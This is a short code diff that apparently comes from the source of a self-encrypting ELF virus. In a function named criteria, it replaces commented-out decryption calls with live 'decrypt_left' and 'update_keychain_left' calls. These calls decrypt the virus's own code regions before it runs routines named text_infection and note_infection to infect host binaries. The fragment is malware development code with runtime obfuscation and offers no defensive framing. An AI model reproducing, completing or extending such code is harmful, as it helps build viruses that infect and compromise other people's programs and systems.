@@ -40,11 +40,11 @@ __attribute__((always_inline)) static inline bool is_infected(const struct s_hos
 
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-
 #if LOGGER
 	MID_LOGGER("criteria:\t\t");
 #endif
+	
+	decrypt_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
 
 	if (context == FAILURE)
 		goto label;
@@ -81,8 +81,8 @@ void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context c
 	}
 
 label:
-//	update_keychain_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-//	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 
 	text_infection(host, keychain, context);
 }
